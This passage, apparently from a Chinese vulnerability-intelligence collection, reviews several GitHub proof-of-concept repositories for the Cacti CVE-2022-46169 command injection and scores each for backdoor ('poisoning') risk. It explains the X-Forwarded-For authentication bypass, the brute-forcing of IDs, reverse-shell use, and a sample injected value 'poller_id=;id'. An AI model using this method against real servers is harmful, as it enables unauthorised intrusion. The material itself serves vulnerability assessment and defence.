## CVE-2022-46169-Cacti-远程命令执行

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 远程命令执行

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行Cacti，并且存在具有 'POLLER_ACTION_SCRIPT_PHP' action类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个未经验证的远程命令执行漏洞。攻击者可以通过构造特定的 HTTP 请求，绕过身份验证，并在目标系统上执行任意命令。

**漏洞利用方式：**

1.  **身份验证绕过：** 攻击者通过设置`X-Forwarded-For`等HTTP Header, 伪造客户端 IP 地址，绕过`remote_agent.php`的身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以通过 `polldata` action，并控制 `poller_id` 参数，将恶意命令注入到 `proc_open` 函数的参数中，从而执行任意系统命令。
3.  **前提条件：** 漏洞利用需要存在一个 `poller_item`，其 `action` 字段设置为 `POLLER_ACTION_SCRIPT_PHP` (值为2)。默认安装的Cacti，很可能存在满足此条件的`poller_item`。
4.  **POC有效性:** 提供的POC代码有效, 利用`remote_agent.php`，设置`X-Forwarded-For` header，构造包含恶意命令的URL,发送请求来执行命令。
5. **投毒风险:** README.md 为漏洞复现步骤，以及github仓库的使用方式说明。POC代码本身除了写入output.txt之外没有发现其他恶意行为。虽然存在一定的风险，例如该代码可能被恶意修改后传播，但当前提供的代码投毒概率较低，大约为1%。该POC的主要功能是检测漏洞是否存在并执行命令，而不是植入后门。

**项目地址:** [a1665454764/CVE-2022-46169](https://github.com/a1665454764/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #15

**来源**: [CVE-2022-46169-alv-david_CVE-2022-46169-Cacti-1.2.22.md](../2022/CVE-2022-46169-alv-david_CVE-2022-46169-Cacti-1.2.22.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti服务可网络访问, 并且存在action类型为POLLER_ACTION_SCRIPT_PHP的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti 1.2.23之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过`remote_agent.php`文件，绕过身份验证，然后利用`polldata`动作，通过构造恶意的`poller_id`参数，执行任意操作系统命令。漏洞利用的关键在于：

1.  **身份验证绕过：** 通过设置`X-Forwarded-For`头，伪造客户端IP地址，绕过`remote_agent.php`的身份验证检查。这是因为`get_client_addr`函数会信任`HTTP_`开头的`$_SERVER`变量，导致可以伪造IP地址。
2.  **命令注入：** 一旦通过身份验证，攻击者可以向`remote_agent.php`发送带有`action=polldata`的请求，其中`poller_id`参数可以被注入恶意命令。程序会将这个参数传递给`proc_open`函数，从而执行攻击者提供的命令。
3.  **利用方式：**  提供的Python脚本首先检查目标是否易受攻击，然后使用提供的LHOST和LPORT生成反向shell有效负载。 脚本通过暴力破解`host_id`和`local_data_ids[]`，构造恶意的URL，发送到目标`remote_agent.php`，从而执行反向shell，从而在目标系统上获得shell访问权限。

**投毒风险分析：**

代码本身主要功能是实现漏洞利用，但仍然存在一定低概率的投毒风险：

*   **潜在的后门：** 虽然代码的主要目的是利用漏洞，但作者可能在payload构建过程中插入了额外的恶意代码，例如，在反向shell payload中添加了额外的命令，用于收集敏感信息或执行其他恶意操作。但是从代码来看，payload是根据用户输入的IP和端口构建的，自定义程度较高，因此payload中存在后门的概率较低。
*   **依赖风险：** 该脚本依赖于`requests`和`urllib`库。虽然这些都是常用的库，但如果这些库本身存在漏洞，或者作者使用了不安全的库函数，可能会引入安全风险。

总体而言，该POC代码的投毒风险较低，约为5%。主要风险在于payload构建过程中可能存在的隐蔽后门，以及对第三方库的依赖。

**项目地址:** [alv-david/CVE-2022-46169-Cacti-1.2.22](https://github.com/alv-david/CVE-2022-46169-Cacti-1.2.22)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #16

**来源**: [CVE-2022-46169-antisecc_CVE-2022-46169.md](../2022/CVE-2022-46169-antisecc_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti实例运行，并且存在`poller_item`记录，其`action`类型为`POLLER_ACTION_SCRIPT_PHP` (2)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个未经身份验证的命令注入漏洞。该漏洞位于 `remote_agent.php` 文件中。攻击者可以通过设置 `X-Forwarded-For` HTTP 头绕过身份验证，然后利用 `polldata` 操作，将恶意命令注入到 `poller_id` 参数中，导致服务器执行任意命令。  

**有效性评估：**

根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此漏洞利用的**有效性高**。漏洞库和搜索引擎结果都确认了该漏洞的存在和严重性，并且已经有公开的漏洞利用代码可用。提供的 Python 脚本 `CVE-2022-46169.py` 实现了漏洞利用过程，包括绕过身份验证和注入命令。  

**投毒风险分析：**

对提供的 Python 脚本进行分析，该脚本的主要功能是利用 CVE-2022-46169 漏洞，不存在明显的恶意代码或后门。但是，任何利用代码都存在被修改的风险，攻击者可能会在代码中添加恶意功能。考虑到代码量较少，逻辑清晰，用户可以容易地进行审查，因此，**投毒风险较低，估计为5%**。这个风险主要来自使用者没有进行代码审计就直接使用，例如添加反弹shell等恶意操作。

**利用方式：**

1.  **身份验证绕过：** 攻击者发送带有 `X-Forwarded-For` 头的 HTTP 请求到 `remote_agent.php`，伪造客户端 IP 地址，绕过身份验证。
2.  **命令注入：** 攻击者构造包含恶意命令的 `poller_id` 参数，通过 `polldata` 操作传递给 `remote_agent.php`。
3.  **命令执行：** Cacti 服务器在处理 `polldata` 操作时，会将 `poller_id` 参数中的恶意命令注入到 `proc_open` 函数中，导致服务器执行任意命令。

**POC利用方式详细过程:**

1.  运行 `CVE-2022-46169.py` 脚本，指定目标 Cacti 实例的 URL 和要执行的命令。
2.  脚本会遍历一系列 `host_id`，并为每个 `host_id` 构建一个包含恶意 `poller_id` 参数的 HTTP GET 请求。
3.  脚本设置 `X-Forwarded-For` 头，伪造客户端 IP 地址，绕过身份验证。
4.  脚本发送 HTTP 请求到 `remote_agent.php`。
5.  如果目标 Cacti 实例存在具有 `POLLER_ACTION_SCRIPT_PHP` 操作类型的 `poller_item`，并且成功绕过身份验证，则服务器将执行 `poller_id` 参数中的恶意命令。
6.  脚本会检查响应中是否包含 "proc" 字符串，以确认命令是否已成功执行。
7.  如果命令执行成功，脚本将输出成功的消息，并显示成功利用的 `host_id`。

**项目地址:** [antisecc/CVE-2022-46169](https://github.com/antisecc/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #17

**来源**: [CVE-2022-46169-ariyaadinatha_cacti-cve-2022-46169-exploit.md](../2022/CVE-2022-46169-ariyaadinatha_cacti-cve-2022-46169-exploit.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程命令执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例配置了 action 类型为 POLLER_ACTION_SCRIPT_PHP (2) 的 poller_item，并且需要网络可达。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti 1.2.23之前的版本中的一个命令注入漏洞。该漏洞允许未经身份验证的攻击者在运行Cacti的服务器上执行任意代码。漏洞存在于`remote_agent.php`文件中，该文件可以通过发送特制的HTTP请求进行访问。攻击者可以通过操纵`X-Forwarded-For` header 绕过身份验证,然后通过 `poller_id`参数执行命令注入。PoC代码利用了这一漏洞，首先验证目标是否存在漏洞，然后暴力破解 `host_id`和 `local_data_id`。 一旦这些ID被找到，攻击者就可以构造包含恶意payload的请求，从而在服务器上执行任意命令。

**有效性:**  提供的PoC代码有效，能够成功利用漏洞实现未经身份验证的远程命令执行。

**投毒风险:**  PoC代码主要功能是漏洞利用，并没有发现明显的恶意投毒代码，例如植入后门、篡改数据等。`cacti.py`脚本的主要功能是：
1.  检测目标是否存在漏洞。
2.  爆破 `host_id` 和 `local_data_id`。
3.  执行命令注入。
代码中唯一的潜在风险点是执行命令注入的payload。如果用户在不知情的情况下使用了危险的payload，可能会对系统造成损害，但是这种风险是用户自身行为造成的，并非代码本身存在恶意。

**利用方式:**
1.  攻击者发送包含`X-Forwarded-For` header的HTTP请求到`remote_agent.php`，绕过身份验证。
2.  攻击者通过暴力破解或其它方式获取可用的 `host_id` 和 `local_data_id`，这些ID对应于`poller_item`表中 `action` 字段为 `POLLER_ACTION_SCRIPT_PHP` (2) 的记录。
3.  攻击者构造包含恶意payload的HTTP请求，通过`poller_id`参数进行命令注入，从而在服务器上执行任意命令。

**项目地址:** [ariyaadinatha/cacti-cve-2022-46169-exploit](https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #18

**来源**: [CVE-2022-46169-copyleftdev_PricklyPwn.md](../2022/CVE-2022-46169-copyleftdev_PricklyPwn.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti服务器存在启用了 POLLER_ACTION_SCRIPT_PHP 的 poller_item

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个命令注入漏洞。未经身份验证的攻击者可以通过操纵 HTTP Header (例如 X-Forwarded-For) 绕过身份验证，并向 remote_agent.php 发送特制的请求，注入恶意命令。漏洞的根本原因是 remote_agent.php 文件中的 polldata 操作在处理 poller_id 参数时，没有进行充分的过滤，导致攻击者可以在 proc_open 函数中执行任意命令。提供的漏洞利用代码 (PricklyPwn) 使用 Go 编写，通过爆破 host_id 和 local_data_ids，构造包含恶意命令的 URL，利用该漏洞获取反向 shell。

**有效性分析：**
漏洞利用代码通过 X-Forwarded-For 头绕过认证, 并爆破`host_id`和`local_data_ids`参数，构造恶意 URL 触发命令注入。根据漏洞信息，利用代码应该是有效的。

**投毒风险分析：**
该仓库包含一个Go编写的漏洞利用程序和一个自述文件。漏洞利用程序的功能是利用 CVE-2022-46169 在 Cacti 上执行命令。Readme文件提供了有关如何使用该漏洞利用程序的信息。虽然代码本身旨在利用已知漏洞，但需要审查是否存在任何隐藏的恶意代码。
*   **main.go:** 代码逻辑清晰，主要功能是构造 Payload 并发送请求以利用漏洞。其中未发现明显的恶意代码。然而，不能完全排除代码中存在细微的后门或漏洞的可能性，例如不正确的错误处理可能导致拒绝服务。
*   **readme.md:** 自述文件只包含有关漏洞利用程序的信息，没有发现任何可疑内容。

考虑到代码主要功能是漏洞利用，但存在一定潜在风险，因此投毒风险评估为10%。

**利用方式：**
1.  攻击者首先需要找到一个存在漏洞的 Cacti 实例 (版本低于 1.2.23)。
2.  攻击者设置`X-Forwarded-For`头为 Cacti 服务器的 IP 地址来绕过身份验证。
3.  攻击者通过爆破`host_id`和`local_data_ids`参数，寻找action类型设置为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。
4.  构造包含恶意命令的 URL，将其作为 poller_id 参数的值传递给 remote_agent.php。
5.  Cacti 服务器执行恶意命令，例如启动反向 shell 连接到攻击者控制的服务器。

**项目地址:** [copyleftdev/PricklyPwn](https://github.com/copyleftdev/PricklyPwn)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #19

**来源**: [CVE-2022-46169-dawnl3ss_CVE-2022-46169.md](../2022/CVE-2022-46169-dawnl3ss_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 目标系统安装Cacti，且存在类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti中一个未经身份验证的命令注入漏洞。漏洞存在于`remote_agent.php`文件中，攻击者可以通过`X-Forwarded-For`头绕过身份验证，然后通过构造恶意的`poller_id`参数，在`poll_for_data`函数中使用`proc_open`执行任意命令。

**有效性：**
提供的PoC代码有效。它首先检查目标是否易受攻击，然后进行暴力破解以查找`host_id`和`local_data_id`，最后构造包含恶意payload的URL来执行命令。

**投毒风险：**
PoC代码本身看起来相对干净，主要功能是利用漏洞。但任何时候都存在一定的风险。漏洞利用代码中存在一定的风险，例如，要求用户输入IP地址和端口，然后构造反向shell的payload。虽然这是漏洞利用的一部分，但用户在复制粘贴代码时可能没有意识到这一点。由于代码的目的是演示漏洞，因此将此定义为恶意投毒是不准确的。风险评估如下：
  * 代码逻辑的直接目的并不是植入后门或执行恶意操作，而是为了演示漏洞利用，大部分操作都需要用户交互。
  * 潜在风险较低，主要体现在用户不理解反向shell的含义，直接运行可能导致自身暴露。
总的来说，投毒风险较低，预估为5%。

**利用方式：**
1.  **身份验证绕过：** 攻击者设置`X-Forwarded-For`头为Cacti服务器的IP地址，绕过`remote_agent.php`的身份验证。
2.  **查找有效ID：** 攻击者暴力破解`host_id`和`local_data_id`，找到`poller_item`表中`action`类型为`POLLER_ACTION_SCRIPT_PHP`的条目。
3.  **命令注入：** 攻击者构造包含恶意命令的`poller_id`参数，发送到`remote_agent.php`，服务器执行该命令。

**结论：** 此漏洞利用风险极高，因为无需身份验证即可远程执行代码。提供的PoC可以有效利用此漏洞，需要及时修补。

**项目地址:** [dawnl3ss/CVE-2022-46169](https://github.com/dawnl3ss/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #20

**来源**: [CVE-2022-46169-devAL3X_CVE-2022-46169_poc.md](../2022/CVE-2022-46169-devAL3X_CVE-2022-46169_poc.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti实例运行，并且存在具有POLLER_ACTION_SCRIPT_PHP action的poller_item。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 存在于 Cacti 1.2.23 之前的版本中。这是一个未经身份验证的命令注入漏洞，允许攻击者在服务器上执行任意代码。攻击者通过伪造 HTTP Header `X-Forwarded-For` 绕过身份验证，然后向 `remote_agent.php` 发送包含恶意 `poller_id` 的 POST 请求，该 `poller_id` 包含要执行的命令。 漏洞利用的关键在于 `remote_agent.php` 中对 `poller_id` 参数的不安全处理，以及对客户端 IP 地址验证的绕过。

提供的 PoC 代码通过 Go 语言实现，利用了该漏洞。它允许指定目标 Cacti 实例的 URL，以及要执行的命令。PoC 代码首先尝试绕过身份验证，然后构造包含恶意命令的 POST 请求。如果成功，服务器将执行该命令，并将结果返回给攻击者。

该PoC未发现明显的投毒代码。主要功能是构造HTTP请求，发送到目标服务器，然后解析返回结果。代码中没有发现任何尝试连接恶意服务器，执行恶意操作或者写入恶意文件的行为。 风险分析基于对提供的PoC代码本身的分析，并不能完全排除其他潜在的风险（例如，如果从不可信的源下载该PoC，则可能存在其他风险）。 因此，为了安全起见，最好人工审核代码，或者从可信的来源获取代码。

**利用方式：**
1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` HTTP Header 为 Cacti 服务器的 IP 地址来绕过身份验证。
2.  **命令注入：** 攻击者构造一个包含恶意命令的 `poller_id` 参数，并通过 POST 请求将其发送到 `remote_agent.php`。
3.  **命令执行：** Cacti 服务器执行 `poller_id` 中包含的命令。

**漏洞利用有效性：**
根据漏洞描述、搜索结果和提供的PoC代码，此漏洞利用是有效的。PoC代码演示了如何利用此漏洞在目标系统上执行任意命令。



**项目地址:** [devAL3X/CVE-2022-46169_poc](https://github.com/devAL3X/CVE-2022-46169_poc)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #21

**来源**: [CVE-2022-46169-devilgothies_CVE-2022-46169.md](../2022/CVE-2022-46169-devilgothies_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例存在一个action类型为POLLER_ACTION_SCRIPT_PHP（值为2）的poller_item配置，并且可以通过HTTP访问remote_agent.php页面

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未经身份验证的命令注入漏洞。该漏洞位于 `remote_agent.php` 文件中，攻击者可以通过构造特定的 HTTP 请求头来绕过身份验证，并通过 `poller_id` 参数注入恶意命令。漏洞利用过程如下：

1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 等 HTTP 头，伪造客户端 IP 地址，使其与 Cacti 服务器本身的 IP 地址匹配。由于 Cacti 验证客户端 IP 地址的方式存在缺陷，攻击者可以绕过身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以向 `remote_agent.php` 发送带有 `action=polldata` 和恶意 `poller_id` 参数的请求。`poller_id` 参数中的值会被插入到 `proc_open` 函数的参数中，从而执行攻击者指定的命令。
3.  **利用代码分析：** 提供的PoC代码首先检查目标是否存在漏洞通过设置`X-Forwarded-For` http头。如果确认存在漏洞，则通过遍历`host_id`和`local_data_ids[]`来寻找配置正确的`poller_item`, 找到后，构造payload，执行反弹shell。
4. **投毒分析：** 检查PoC代码和README.md文件，未发现任何明显的恶意代码或后门。所有的代码都致力于利用此漏洞，没有发现有任何与预期功能不符的部分。因此，投毒风险评估为0%。

**总结：**
该漏洞允许未经身份验证的攻击者在目标系统上执行任意命令，风险极高。提供的PoC代码可以有效地利用该漏洞。该漏洞已被CISA列入已知被利用的漏洞目录（KEV）。

**项目地址:** [devilgothies/CVE-2022-46169](https://github.com/devilgothies/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #22

**来源**: [CVE-2022-46169-doosec101_CVE-2022-46169.md](../2022/CVE-2022-46169-doosec101_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响的Cacti版本，并且存在action类型为POLLER_ACTION_SCRIPT_PHP的poller_item。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti中存在的一个未经身份验证的命令注入漏洞。漏洞位于`remote_agent.php`文件中。由于`get_client_addr`函数对客户端IP地址的验证不充分，攻击者可以通过设置`HTTP_`开头的`$_SERVER`变量来伪造IP地址，绕过身份验证。绕过身份验证后，攻击者可以通过`polldata`操作，利用`poller_id`参数中的命令注入漏洞，执行任意系统命令。

**漏洞利用方式：**
1.  攻击者发送包含`Forwarded-For`头部的HTTP请求到`remote_agent.php`，伪造客户端IP地址，绕过身份验证。
2.  攻击者构造包含恶意命令的`poller_id`参数，并将其作为`polldata`操作的一部分发送到`remote_agent.php`。
3.  服务器执行攻击者提供的恶意命令。

**有效性：**
提供的POC代码`CVE-2022-46169.py`是一个简单的漏洞检测脚本，它通过发送包含特定参数的HTTP GET请求到`remote_agent.php`来判断目标系统是否存在漏洞。该脚本并非完整的漏洞利用代码，但它可以用来验证目标系统是否容易受到攻击。

**投毒风险：**
分析了提供的POC代码和相关文件，没有发现明显的恶意代码或后门。`requirements.txt`中列出的依赖项`optparse`, `httpx`, `termcolor` 都是常见的Python库，没有已知的安全问题。作者隐藏的投毒代码可能性较低，风险评估为0%。

**项目地址:** [doosec101/CVE-2022-46169](https://github.com/doosec101/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #23

**来源**: [CVE-2022-46169-icebreack_CVE-2022-46169.md](../2022/CVE-2022-46169-icebreack_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-远程命令执行

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 远程命令执行 (RCE)

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标服务器运行受影响版本的Cacti，且存在一个action类型为POLLER_ACTION_SCRIPT_PHP的poller_item

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Cacti的remote_agent.php文件中。由于对客户端IP地址的验证存在缺陷，未经身份验证的攻击者可以通过设置X-Forwarded-For头部绕过身份验证，然后利用polldata动作中的命令注入漏洞执行任意命令。

**有效性：**
根据漏洞信息和提供的PoC代码，该漏洞是有效的。PoC代码利用了X-Forwarded-For头部的欺骗来绕过身份验证，然后通过构造包含恶意命令的poller_id参数来触发命令注入。

**投毒风险：**
PoC代码本身的功能是利用已知的漏洞进行攻击，并没有发现隐藏的恶意代码或后门。代码的功能较为清晰，主要包括发送HTTP请求、构造Payload等。因此，可以认为投毒风险为0%。

**利用方式：**
1.  攻击者发送包含`X-Forwarded-For`头的HTTP请求到`remote_agent.php`，将该头部设置为Cacti服务器的IP地址，绕过身份验证。
2.  攻击者构造一个包含恶意命令的`poller_id`参数，并将其作为GET请求参数发送到`remote_agent.php?action=polldata`。
3.  `remote_agent.php`在处理`polldata`动作时，会将`poller_id`参数插入到`proc_open`函数调用的命令中，导致命令注入。
4.  攻击者可以通过暴力破解`host_id`和`local_data_ids`参数，找到一个`action`类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`，从而成功执行恶意命令。

**项目地址:** [icebreack/CVE-2022-46169](https://github.com/icebreack/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #24

**来源**: [CVE-2022-46169-lof1sec_CVE-2022-46169.md](../2022/CVE-2022-46169-lof1sec_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例存在具有POLLER_ACTION_SCRIPT_PHP（即action类型为2）的poller_item配置，并且攻击者可以访问remote_agent.php

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 存在于Cacti的`remote_agent.php`文件中，允许未经身份验证的攻击者执行任意代码。利用方式如下：

1.  **身份验证绕过：** 攻击者通过伪造`X-Forwarded-For` HTTP头，将其设置为运行Cacti服务器的IP地址，从而绕过身份验证。这是因为`get_client_addr`函数会读取这些HTTP头来确定客户端IP地址，并且之后通过`gethostbyaddr`解析IP地址为主机名，而Cacti服务器自身的主机名通常在`poller`表中存在，导致验证通过。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以利用`polldata`动作，该动作会使用`proc_open`执行PHP脚本。攻击者可以通过`poller_id`参数注入恶意命令。例如，`poller_id=;id`将执行`id`命令。
3.  **前提条件：** 要触发命令注入，必须存在一个`poller_item`，其`action`字段设置为`POLLER_ACTION_SCRIPT_PHP`（值为2）。`host_id`和`local_data_id`可以通过暴力破解找到。

**有效性：**

提供的PoC代码利用了上述漏洞。首先，它检查目标是否容易受到攻击（`checkVuln`函数）。然后，它通过暴力破解（`bruteForce`函数）确定有效的`host_id`和`local_data_id`。最后，它使用精心设计的payload（`remoteCodeExecution`函数）将恶意命令注入到`poller_id`参数中，从而在服务器上执行任意代码。由于CVE细节和搜索结果确认了此漏洞，PoC代码应有效。

**投毒风险：**

查看PoC代码和相关的README文件，未发现任何恶意或可疑的代码。PoC代码仅包含利用CVE-2022-46169漏洞的代码。因此，投毒风险为0%。

**搜索引擎结果：**

搜索引擎结果证实了CVE-2022-46169是一个未经身份验证的命令注入漏洞，影响Cacti的早期版本。多个来源都强调了该漏洞已被积极利用。


**项目地址:** [lof1sec/CVE-2022-46169](https://github.com/lof1sec/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #25

**来源**: [CVE-2022-46169-m3ssap0_cacti-rce-cve-2022-46169-vulnerable-application.md](../2022/CVE-2022-46169-m3ssap0_cacti-rce-cve-2022-46169-vulnerable-application.md)

## CVE-2022-46169 - Cacti 未授权命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意代码

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行受影响的Cacti版本，且存在 action 类型为 POLLER_ACTION_SCRIPT_PHP (2) 的 poller_item 配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未授权命令注入漏洞。攻击者可以通过利用 `remote_agent.php` 文件的认证绕过漏洞，结合 `polldata` 操作，最终实现命令注入。漏洞利用流程如下：

1.  **认证绕过：** 攻击者通过伪造 `HTTP_` 请求头（例如 `Forwarded-For`），使得 `get_client_addr` 函数返回 Cacti 服务器自身的 IP 地址。这样，后续的 hostname 检查会被绕过，从而无需认证即可访问 `remote_agent.php`。
2.  **触发 polldata 操作：** 成功绕过认证后，攻击者可以调用 `remote_agent.php` 的 `polldata` 操作。
3.  **命令注入：** `poll_for_data` 函数从请求参数中获取 `poller_id`，该参数没有经过充分过滤，直接拼接到 `proc_open` 函数的参数中，导致命令注入。
4.  **条件：** 漏洞触发需要数据库中存在 action类型为`POLLER_ACTION_SCRIPT_PHP` (`2`)的`poller_item`。

**POC 代码分析：**

提供的 Dockerfile 构建了一个易受攻击的 Cacti 1.2.22 环境，用于漏洞测试。该 Dockerfile 主要完成了以下工作：

*   安装必要的依赖项，例如 `rrdtool`、`mariadb-server`、`snmp` 等。
*   配置 PHP 扩展。
*   从 GitHub 克隆 Cacti 1.2.22 版本的代码。
*   配置 Cacti 数据库和初始化脚本。
*   配置 cron 任务来运行 `poller.php`。

**有效性评估：**

根据漏洞描述和 POC 代码，可以判断该漏洞利用的有效性很高。POC 代码提供了一个可复现的环境，方便研究人员进行漏洞测试和利用。

**投毒风险评估：**

该存储库中的投毒风险较低（约 5%）。理由如下：

*   Dockerfile 内容清晰：Dockerfile 中的指令主要用于构建 Cacti 运行环境，没有发现任何可疑的恶意代码或后门。 *   cacti.sql 来源于官方github仓库，该文件被篡改风险较低。 *   config.php主要是数据库配置，不具备投毒条件。
*   README.md 包含警告信息：该文件明确指出此应用包含安全漏洞，并建议在受保护的环境中运行，降低了恶意使用的可能性。
*   LICENSE 使用的是公共领域许可证：这表明作者放弃了对代码的版权，鼓励自由使用和修改，但同时也增加了代码被滥用的风险。

尽管如此，仍然存在一些潜在的风险：

*   依赖项可能存在漏洞：Dockerfile 中安装的软件包可能存在未知的安全漏洞，攻击者可以通过这些漏洞入侵系统。 *   配置错误：不正确的 Cacti 配置可能导致安全问题。

**总体来说，该存储库的投毒风险较低，但仍需谨慎使用，并及时更新依赖项以避免潜在的安全风险。**

**项目地址:** [m3ssap0/cacti-rce-cve-2022-46169-vulnerable-application](https://github.com/m3ssap0/cacti-rce-cve-2022-46169-vulnerable-application)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #26

**来源**: [CVE-2022-46169-miko550_CVE-2022-46169.md](../2022/CVE-2022-46169-miko550_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意操作系统命令。

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行Cacti并且存在具有POLLER_ACTION_SCRIPT_PHP（值为2）操作类型的 poller_item 配置项。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过构造特制的 HTTP 请求，绕过身份验证，并在目标系统上执行任意操作系统命令。

**利用方式：**
1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` HTTP 头来欺骗 `get_client_addr` 函数，使其返回 Cacti 服务器自身的 IP 地址。由于 poller 表中存在默认的服务器主机名条目，因此可以绕过身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以调用 `remote_agent.php` 文件的 `polldata` 操作。`poll_for_data` 函数会检索请求参数并从数据库中加载相应的 `poller_item` 条目。如果 `poller_item` 的 `action` 字段等于 `POLLER_ACTION_SCRIPT_PHP`，则使用 `proc_open` 执行 PHP 脚本。攻击者可以控制 `$poller_id` 参数，该参数会被插入到传递给 `proc_open` 的字符串中，从而导致命令注入。
